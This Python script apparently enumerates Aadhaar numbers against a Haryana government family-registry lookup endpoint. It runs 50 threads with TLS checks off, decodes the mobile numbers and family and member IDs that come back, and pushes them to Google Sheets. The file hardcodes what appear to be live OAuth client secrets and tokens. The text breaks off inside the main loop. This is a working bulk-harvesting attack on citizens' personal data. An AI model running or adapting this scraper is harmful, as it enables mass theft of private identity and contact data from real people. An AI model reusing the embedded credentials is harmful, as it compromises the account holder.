import sys, os, requests, base64, urllib3, threading, time, socket, signal, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from uid import uid  # your existing UID generator

# === CONFIG ===
LAST_SERIAL_FILE = "last_serial.txt"
SHEET_STATE_FILE = "sheet_state.json"
MAX_ROWS_PER_SHEET = 100     # sheet rows
BATCH_SIZE = 100
TOTAL_LIMIT = 200    #1 lakh 
THREADS = 50
RETRIES = 3
ERROR_LIMIT = 10
API_URL = "https://ppp-office.haryana.gov.in/ReportGrievance/SearchFamilyByAadharNo"
# 🔐 OAuth credentials
CLIENT_ID = "737936576743-5dq4nrm7gemrhcks9k4rj5jb0i1futqh.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REFRESH_TOKEN = "1//04SZPj0Na1xgFCgYIARAAGAQSNwF-L9IrvlAvyrcEU5z2rVto6skNdq9MgFjQUAIPA7zfdJ6yhnT3zz77EpVEmXPCU7gWnSviCzo"
ACCESS_TOKEN = "ya29.a0AS3H6Nxk4L6qLjkxisU4QEfSvFFU3PyzNL5XFNRL1ZYhp1OLa4yVTavEeNTfjytwMJ4njQSVugnW-5sOV-araEOTpvUwxMDwXcuYc81YYoDVMXCchNMi2r98q-ztaCU4lnmvy4Ml1clfVqciuZY1KylSHTKkVlYEDVLrZXToexW4w4i97eElucopHsJ5GtdbVRtX34waCgYKAcUSARMSFQHGX2MimISWb5_lv3XIgKWZcpPozg0206"

SHEET_PREFIX = "UID_Results_"
SHEET_HEADERS = ["serial", "uid", "status", "Mobileno", "NewMemberID", "NewFamilyID", "checked_at"]

# === Globals ===
lock = threading.Lock()
ok_results = []
error_count = 0
stop_event = threading.Event()
first_digit = 2

# === Safe Exit ===
def graceful_exit(signum, frame):
    print("\n🛑 Ctrl+C detected! Saving progress and shutting down...")
    stop_event.set()
    for t in threading.enumerate():
        if t is not threading.current_thread():
            try: t.join(timeout=1)
            except: pass
    print("✅ Clean shutdown complete.")
    sys.exit(0)

signal.signal(signal.SIGINT, graceful_exit)

# === OAuth Refresh ===
def refresh_access_token():
    global ACCESS_TOKEN
    token_url = "https://oauth2.googleapis.com/token"
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": REFRESH_TOKEN,
        "grant_type": "refresh_token"
    }
    res = requests.post(token_url, data=payload)
    if res.status_code == 200:
        ACCESS_TOKEN = res.json()["access_token"]
        print("🔄 Access token refreshed.")
        return True
    else:
        print("❌ Token refresh failed:", res.text)
        return False

# === Sheet State ===
def load_sheet_state():
    if not os.path.exists(SHEET_STATE_FILE): return None
    try:
        with open(SHEET_STATE_FILE, "r") as f:
            return json.load(f)
    except: return None

def save_sheet_state(sheet_name, sheet_id):
    with open(SHEET_STATE_FILE, "w") as f:
        json.dump({"sheet_name": sheet_name, "sheet_id": sheet_id}, f, indent=2)

# === Google Sheets ===
def create_new_sheet(file_no):
    if not refresh_access_token():                  # ⬅️ Line 2 above
        print("❌ Cannot proceed without valid access token.")  # ✅ Your inserted line
        return None    
    sheet_name = f"{SHEET_PREFIX}{file_no}"
    url = "https://sheets.googleapis.com/v4/spreadsheets"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    body = {"properties": {"title": sheet_name}}
    res = requests.post(url, headers=headers, data=json.dumps(body))
    if res.status_code == 200:
        sheet_id = res.json()["spreadsheetId"]
        print(f"📄 Sheet created: {sheet_id}")
        save_sheet_state(sheet_name, sheet_id)
        write_headers(sheet_id)
        return sheet_id
    else:
        print("❌ Sheet creation failed:", res.text)
        return None

def write_headers(sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    params = {"valueInputOption": "RAW"}
    data = {"values": [SHEET_HEADERS]}
    requests.post(url, headers=headers, params=params, data=json.dumps(data))

def get_logged_uids(sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1"
    headers = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
    res = requests.get(url, headers=headers)
    if res.status_code == 200:
        values = res.json().get("values", [])[1:]
        return {row[1] for row in values if len(row) > 1}
    return set()

def write_batch_to_sheet(rows, sheet_id):
    url = f"https://sheets.googleapis.com/v4/spreadsheets/{sheet_id}/values/Sheet1!A1:append"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    params = {"valueInputOption": "RAW"}
    data = {"values": rows}
    res = requests.post(url, headers=headers, params=params, data=json.dumps(data))
    if res.status_code == 200:
        print(f"📊 {len(rows)} rows written to sheet.")
        return True
    elif res.status_code == 401:
        refresh_access_token()
        return write_batch_to_sheet(rows, sheet_id)
    else:
        print("❌ Sheet write failed:", res.text)
        return False

# === UID Check ===
def check_uid(serial, uid_val, logged_uids):
    global error_count
    if stop_event.is_set(): return False
    if uid_val in logged_uids: return True

    encoded_uid = base64.b64encode(uid_val.encode()).decode()
    params = {"AadharNo": encoded_uid}

    for attempt in range(RETRIES):
        try:
            r = requests.get(API_URL, params=params, verify=False, timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if not data: return True  # ✅ blank → ignore
                    item = data[0]
                    for key in ["Mobileno", "NewMemberID", "NewFamilyID"]:
                        if item.get(key):
                            try: item[key] = base64.b64decode(item[key]).decode("utf-8")
                            except: pass
                    row = [
                        str(serial), uid_val, str(r.status_code),
                        item.get("Mobileno", ""), item.get("NewMemberID", ""),
                        item.get("NewFamilyID", ""), time.strftime("%Y-%m-%d %H:%M:%S")
                    ]
                    with lock: ok_results.append(row)
                    return True
                except: return True
            else:
                with lock: error_count += 1
                return False
        except Exception as e:
            if attempt == RETRIES - 1:
                with lock: error_count += 1
            else:
                time.sleep(0.5)
    return False

# === Batch Processing ===
def process_batch(batch_serials, logged_uids):
    global error_count
    error_count = 0
    ok_results.clear()
    uids_batch = [(s, uid(s, first_digit)) for s in batch_serials]
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(lambda tup: check_uid(tup[0], tup[1], logged_uids), uids_batch)
    return True

# === Main ===
def main():
    try:
        with open(LAST_SERIAL_FILE, "r") as f:
            parts = f.read().strip().split(",")
            start_serial = int(parts[1]) if len(parts) == 2 else 0
    except: start_serial = 0

    end_serial = start_serial + TOTAL_LIMIT - 1
    state = load_sheet_state()
    if state:
        sheet_id = state["sheet_id"]
        sheet_name = state["sheet_name"]
        file_no = int(sheet_name.split("_")[-1])
    else:
        file_no = 1
        sheet_id = create_new_sheet(file_no)
        sheet_name = f"{SHEET_PREFIX}{file_no}"
        if not sheet_id:
            print("❌ Sheet creation failed. sheet_state.json not created. Exiting.")
            return


    logged_uids = get_logged_uids(sheet_id)
    current_serial = start_serial

    while current_serial <= end_serial:
        batch_end = min(current_serial + BATCH_SIZE - 1, end_serial)
        batch_serials = list(range(current_serial, batch_end + 1))
        print(f"🔍 Processing {current_serial} → {batch_end}")
        process_batch(batch_serials, logged_uids)

        if len(logged_uids) + len(ok_results) >= MAX_ROWS_PER_SHEET:
            file_no += 1
            sheet_id = create_new_sheet(file_no)
            sheet_name = f"{SHEET_PREFIX}{file_no}"
            logged_uids = set()

        if ok_results:
            success = write_batch_to_sheet(ok_results, sheet_id)
            if success:
                logged_uids.update([row[1] for row in ok_results])
                with open(LAST_SERIAL_FILE, "w") as f:
                    f.write(f"{first_digit},{batch_end}")
                current_serial = batch_end + 1
